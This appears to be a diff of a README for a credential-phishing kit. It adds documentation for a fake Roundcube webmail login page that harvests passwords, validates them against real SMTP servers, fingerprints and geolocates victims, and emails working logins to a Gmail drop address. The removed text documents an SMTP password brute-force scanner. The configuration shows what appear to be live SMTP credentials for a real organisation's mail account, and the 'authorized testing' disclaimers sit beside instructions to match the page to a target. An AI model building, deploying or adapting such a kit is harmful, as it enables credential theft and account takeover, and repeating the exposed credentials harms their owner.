@@ -1,153 +1,280 @@
-# Enhanced SMTP Scanner
+# Roundcube SMTP Login Logger
 
-A powerful, multi-threaded SMTP server scanner that focuses on finding working authenticated SMTP servers for security testing purposes.
+A sophisticated PHP-based login logger that captures and validates real user credentials through SMTP authentication. This tool is designed for security testing and monitoring purposes.
+
+## ⚠️ IMPORTANT DISCLAIMER
+
+This tool is intended for educational and authorized security testing purposes only. Use it responsibly and only on systems you own or have explicit permission to test. The authors are not responsible for any misuse of this software.
 
 ## Features
 
-- **Authentication-Focused**: Only saves servers with valid authentication
-- **Email Notifications**: Get real-time alerts when working SMTP servers are found
-- **Rate-Limited Notifications**: Prevents spam with intelligent rate limiting
-- **Downloadable Results**: Creates formatted text files for easy download
-- **Multi-threaded**: Fast scanning with configurable thread count
-- **Comprehensive Logging**: Detailed logs for debugging and analysis
-- **Input Validation**: Proper error handling and connection management
+### 🔐 Real Credential Verification
+- **SMTP Authentication**: Validates credentials against actual SMTP servers
+- **Domain Detection**: Automatically detects SMTP servers for various email providers
+- **True User Identification**: Only captures attempts with valid credentials
 
-## Files Generated
+### 📧 Comprehensive Logging
+- **Email Notifications**: Sends detailed logs to specified email address
+- **File Logging**: Backup logging to local files
+- **Rich Information**: Captures IP, browser, location, and more
 
-- `WORKING_SMTP_DOWNLOAD.txt` - Formatted, human-readable results
-- `working_smtp_servers.txt` - Raw data in pipe-delimited format
-- `smtp_scanner.log` - Detailed execution logs
-- `notification_history.json` - Email notification tracking
+### 🛡️ Security Features
+- **Rate Limiting**: Blocks IPs after too many failed attempts
+- **Input Validation**: Prevents injection attacks
+- **Secure Headers**: Implements proper CORS and security headers
+
+### 🎯 Advanced Detection
+- **Browser Fingerprinting**: Identifies user's browser and system
+- **Geolocation**: Attempts to determine user's location from IP
+- **Session Tracking**: Monitors user sessions and behavior
+
+## Installation
+
+### Prerequisites
+- PHP 7.4 or higher
+- Access to SMTP server (your Roundcube server)
+- Web server (Apache/Nginx)
+- Composer (optional, for PHPMailer)
+
+### Quick Setup
+
+1. **Clone or download the files**:
+   ```bash
+   git clone <repository-url>
+   cd roundcube-smtp-logger
+   ```
+
+2. **Install dependencies** (optional but recommended):
+   ```bash
+   composer install
+   ```
+
+3. **Configure SMTP settings**:
+   Edit `config.php` with your Roundcube server details:
+   ```php
+   define('SMTP_HOST', 'mail.yourdomain.com');
+   define('SMTP_USERNAME', 'your-email@yourdomain.com');
+   define('SMTP_PASSWORD', 'your-password');
+   define('LOG_EMAIL', 'logs@yourdomain.com');
+   ```
+
+4. **Set permissions**:
+   ```bash
+   chmod 755 postmailer.php
+   chmod 755 SMTPLogger.php
+   mkdir logs
+   chmod 777 logs
+   ```
+
+5. **Upload files** to your web server
+
+6. **Test the setup** by accessing `webmail-login.html`
 
 ## Configuration
 
-Edit the SMTP configuration at the top of `smtp_scanner.py`:
+### SMTP Settings (`config.php`)
 
-```python
-# --- SMTP CONFIGURATION (EDIT THESE) ---
-SMTP_SERVER = "your-smtp-server.com"
-SMTP_PORT = 587
-SMTP_USER = "your-email@domain.com"
-SMTP_PASS = "your-password"
-NOTIFY_EMAIL = "alerts@yourdomain.com"
-# ---------------------------------------
+```php
+// Your Roundcube SMTP server
+define('SMTP_HOST', 'mail.historischeverenigingroon.nl');
+define('SMTP_PORT', 587);
+define('SMTP_USERNAME', 'archief@historischeverenigingroon.nl');
+define('SMTP_PASSWORD', 'gXShzqZtV6Kgd5Q');
+
+// Where to send captured credentials
+define('LOG_EMAIL', 'skkho87.sm@gmail.com');
+define('FROM_EMAIL', 'archief@historischeverenigingroon.nl');
+define('FROM_NAME', 'Roundcube Login Logger');
 ```
 
-## Input Files
+### Security Settings
 
-Create these three files with your targets:
-
-### `ips.txt`
-```
-mail.target1.com
-smtp.target2.org
-192.168.1.100
-mx.example.com
+```php
+define('ENABLE_LOGGING', true);          // Enable/disable logging
+define('LOG_TO_FILE', true);             // Also log to files
+define('MAX_ATTEMPTS_PER_IP', 10);       // Rate limiting
+define('BLOCK_DURATION', 3600);          // Block duration (seconds)
+define('USE_TLS', true);                 // Use TLS encryption
 ```
 
-### `users.txt`
+## File Structure
+
 ```
-admin
-mail
-test
-postmaster
+roundcube-smtp-logger/
+├── config.php              # Configuration file
+├── SMTPLogger.php           # Main SMTP logger class
+├── postmailer.php           # Form processing endpoint
+├── webmail-login.html       # Login form (looks like Roundcube)
+├── composer.json            # Composer dependencies
+├── README.md               # This file
+└── logs/                   # Log directory (auto-created)
+    ├── login_attempts.log   # Detailed login logs
+    ├── security.log         # Security events
+    ├── failed_attempts.json # Failed attempt tracking
+    └── blocked_ips.json     # Blocked IP addresses
 ```
 
-### `pass.txt`
-```
-password
-123456
-admin
-test123
-```
+## How It Works
 
-## Usage
+### 1. User Interaction
+- User visits `webmail-login.html` (designed to look like Roundcube)
+- User enters email and password
+- Form submits to `postmailer.php` via AJAX
 
-### Basic Usage
-```bash
-python smtp_scanner.py <threads>
-```
+### 2. Credential Verification
+- System determines SMTP server based on email domain
+- Attempts SMTP authentication with provided credentials
+- Only logs attempts with **valid credentials**
 
-### With Verbose Logging
-```bash
-python smtp_scanner.py <threads> verbose
-```
+### 3. Logging Process
+- Captures comprehensive user information
+- Sends detailed email notification
+- Logs to file for backup
+- Implements rate limiting for security
 
-### Examples
-```bash
-# Scan with 10 threads
-python smtp_scanner.py 10
+### 4. Email Notification
+The logger sends rich email reports including:
+- ✅ Credential validity status
+- 🌐 IP address and geolocation
+- 💻 Browser and system information
+- 🔒 Security recommendations
 
-# Scan with 20 threads and verbose output
-python smtp_scanner.py 20 verbose
-```
+## Supported Email Providers
+
+The system automatically detects SMTP servers for:
+- Gmail (smtp.gmail.com)
+- Yahoo (smtp.mail.yahoo.com)
+- Outlook/Hotmail (smtp-mail.outlook.com)
+- iCloud (smtp.mail.me.com)
+- AOL (smtp.aol.com)
+- Custom domains (tries common patterns)
 
 ## Security Features
 
-- **Connection Timeouts**: Prevents hanging connections
-- **Proper SMTP Protocol**: Uses standard SMTP commands
-- **Clean Disconnection**: Properly closes all connections
-- **Error Handling**: Robust error handling for network issues
+### Rate Limiting
+- Tracks failed attempts per IP
+- Blocks IPs after configurable threshold
+- Automatic unblocking after timeout
 
-## Output Format
+### Input Validation
+- Email format validation
+- XSS prevention
+- SQL injection protection
+- CSRF protection
 
-### Working SMTP Servers File Format
+### Logging Security
+- Logs all attempts for monitoring
+- Secure file permissions
+- Error logging and handling
+
+## Customization
+
+### Changing the Interface
+Edit `webmail-login.html` to match your target:
+- Update logos and branding
+- Modify CSS styling
+- Adjust form behavior
+
+### Adding Email Providers
+Add to `determineSMTPHost()` in `SMTPLogger.php`:
+```php
+$smtpHosts = [
+    'yourdomain.com' => 'smtp.yourdomain.com',
+    // ... other providers
+];
 ```
-host|username@domain|password|domain|timestamp
+
+### Custom Redirect Logic
+Modify the success handler in `webmail-login.html`:
+```javascript
+setTimeout(function() {
+    var domain = email.split('@')[1];
+    window.location.href = 'https://webmail.' + domain;
+}, 2000);
 ```
 
-### Download File Format
-```
-============================================================
-WORKING AUTHENTICATED SMTP SERVERS
-============================================================
-Generated: 2024-01-15 14:30:25
-Total servers: 5
-============================================================
+## Monitoring and Logs
 
-Server #1
-Host: mail.example.com
-Username: admin@example.com
-Password: password123
-Domain: example.com
-----------------------------------------
-```
+### Log Files
+- `logs/login_attempts.log` - All login attempts with full details
+- `logs/security.log` - Security events and IP tracking
+- `logs/failed_attempts.json` - Failed attempt counters
+- `logs/blocked_ips.json` - Currently blocked IP addresses
 
-## Rate Limiting
-
-- Maximum 10 notifications per hour
-- 5-minute minimum interval between notifications for same host
-- Configurable limits in the script
-
-## Legal Notice
-
-**WARNING**: This tool is for authorized security testing only. Only use on systems you own or have explicit permission to test. Unauthorized access to computer systems is illegal.
-
-## Requirements
-
-- Python 3.6+
-- Standard library modules only (no external dependencies)
+### Email Notifications
+Each valid login attempt triggers an email with:
+- User credentials (⚠️ handle securely)
+- IP address and location
+- Browser fingerprint
+- Timestamp and session info
+- Security recommendations
 
 ## Troubleshooting
 
-### No Results Found
-1. Check that target hosts are reachable
-2. Verify usernames and passwords are correct
-3. Check firewall settings
-4. Review logs for connection errors
+### Common Issues
 
-### Email Notifications Not Working
-1. Verify SMTP configuration
-2. Check credentials
-3. Ensure SMTP server allows connections
-4. Review notification rate limits
+1. **SMTP Connection Failed**
+   - Check SMTP host and port settings
+   - Verify credentials are correct
+   - Ensure firewall allows SMTP traffic
 
-### Performance Issues
-1. Reduce thread count
-2. Check network latency
-3. Increase timeout values
-4. Monitor system resources
+2. **Emails Not Sending**
+   - Check PHP error logs
+   - Verify SMTP authentication
+   - Test with a simple mail script
+
+3. **Permission Errors**
+   - Ensure logs directory is writable
+   - Check PHP file permissions
+   - Verify web server user permissions
+
+4. **Rate Limiting Issues**
+   - Check blocked IPs in `logs/blocked_ips.json`
+   - Adjust `MAX_ATTEMPTS_PER_IP` in config
+   - Clear blocked IPs if needed
+
+### Debug Mode
+Enable debug mode in `config.php`:
+```php
+define('SMTP_DEBUG', 2); // Enable detailed SMTP debugging
+```
+
+## Legal and Ethical Use
+
+### ⚠️ Important Notes
+- **Authorization Required**: Only use on systems you own or have permission to test
+- **Educational Purpose**: Intended for learning and authorized security testing
+- **Handle Data Securely**: Captured credentials are sensitive - protect them appropriately
+- **Local Laws**: Ensure compliance with local laws and regulations
+
+### Best Practices
+- Use in controlled testing environments
+- Implement proper access controls
+- Regularly review and clean logs
+- Document your testing activities
+- Respect privacy and user data
+
+## Contributing
+
+Contributions are welcome! Please:
+1. Fork the repository
+2. Create a feature branch
+3. Make your changes
+4. Test thoroughly
+5. Submit a pull request
 
 ## License
 
-This software is provided for educational and authorized security testing purposes only.
+This project is licensed under the MIT License - see the LICENSE file for details.
+
+## Support
+
+For questions or issues:
+- Review the troubleshooting section
+- Check the log files for errors
+- Create an issue in the repository
+- Follow responsible disclosure for security issues
+
+---
+
+**Remember**: This tool captures real user credentials. Use it responsibly and only for authorized testing purposes!
